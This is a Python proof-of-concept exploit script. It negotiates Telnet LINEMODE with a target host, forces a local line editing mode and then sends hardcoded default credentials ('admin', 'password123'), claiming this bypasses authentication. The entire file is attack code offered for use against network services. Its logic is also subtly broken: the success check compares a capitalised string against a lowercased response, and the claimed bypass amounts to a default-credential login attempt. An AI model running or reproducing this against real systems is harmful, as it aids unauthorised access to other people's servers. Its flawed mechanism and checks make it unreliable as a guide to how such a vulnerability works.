#!/usr/bin/env python3
"""
Proof-of-Concept: Telnet LINEMODE State Confusion / Local Line Editing Bypass

This script demonstrates how negotiating the LINEMODE option (RFC 1184) can force
a server into 'Local Line Editing' mode. In this mode, the server buffers input
until a full line is received (CR LF), potentially bypassing authentication daemons
that expect character-at-a-time processing for password prompts.
"""
import socket
import struct
import sys
import time

# Telnet Protocol Constants
IAC = b'\xff'
WILL = b'\xfb'
WONT = b'\xfc'
DO = b'\xfd'
DONT = b'\xfe'
SB = b'\xfa'
SE = b'\xf0'
LINEMODE = 34
MODE_LOCAL_EDITING = 0x02 # Local line editing and local signal trapping (RFC 1184)

def send_telnet_option(sock, command, option):
    """Send a Telnet option negotiation command."""
    sock.sendall(IAC + command + struct.pack('B', option))

def send_linemode_subnegotiation(sock, mode):
    """Send LINEMODE subnegotiation to set local line editing mode."""
    # IAC SB LINEMODE MODE <mode> IAC SE
    payload = IAC + SB + struct.pack('B', LINEMODE) + b'\x01' + struct.pack('B', mode) + IAC + SE
    sock.sendall(payload)

def main():
    if len(sys.argv) < 3:
        print("Usage: python poc_telnet_linemode_state_confusion.py <target_ip> <target_port>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])

    print(f"[*] Connecting to {target_ip}:{target_port}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    sock.settimeout(5.0)

    # Step 1: Receive initial banner
    try:
        banner = sock.recv(4096).decode('utf-8', errors='ignore')
        print(f"[*] Banner received:\n{banner}")
    except socket.timeout:
        print("[-] Timeout receiving banner.")
        return

    # Step 2: Negotiate LINEMODE option (RFC 1184)
    # Client sends WILL LINEMODE to indicate it supports and wants to use LINEMODE
    print("[*] Sending WILL LINEMODE...")
    send_telnet_option(sock, WILL, LINEMODE)

    # Wait for server response (DO LINEMODE or DONT LINEMODE)
    try:
        response = sock.recv(4096).decode('utf-8', errors='ignore')
        print(f"[*] Server response to WILL LINEMODE: {response}")
    except socket.timeout:
        print("[-] Timeout waiting for server response.")
        return

    # Step 3: Send LINEMODE subnegotiation to force Local Line Editing Mode (MODE 0x02)
    # According to RFC 1184 Section 3, if WILL LINEMODE is negotiated, defaults are MODE 0.
    # We explicitly set it to Local Line Editing to trigger the state confusion.
    print("[*] Sending LINEMODE subnegotiation for Local Line Editing (MODE 0x02)...")
    send_linemode_subnegotiation(sock, MODE_LOCAL_EDITING)

    # Wait for server acknowledgment or prompt
    try:
        response = sock.recv(4096).decode('utf-8', errors='ignore')
        print(f"[*] Server response to LINEMODE subnegotiation: {response}")
    except socket.timeout:
        print("[-] Timeout waiting for server acknowledgment.")
        return

    # Step 4: Attempt to bypass character-at-a-time auth by sending full line immediately
    # In local line editing mode, the server should buffer input until CR LF is received.
    # If the auth daemon expects character-by-character processing, it may be confused or bypassed.
    print("[*] Sending credential payload as a single line (bypassing char-at-a-time validation)...")
    payload = b"admin\r\npassword123\r\n"
    sock.sendall(payload)

    # Observe outcome
    try:
        response = sock.recv(4096).decode('utf-8', errors='ignore')
        print(f"[*] Server response to payload:\n{response}")
        if "Access granted" in response or "Login successful" in response.lower():
            print("[+] VULNERABLE: Authentication bypassed via LINEMODE state confusion!")
        else:
            print("[-] PATCHED/NOT VULNERABLE: Server processed input normally or rejected it.")
    except socket.timeout:
        print("[-] Timeout waiting for final response.")

    sock.close()

if __name__ == "__main__":
    main()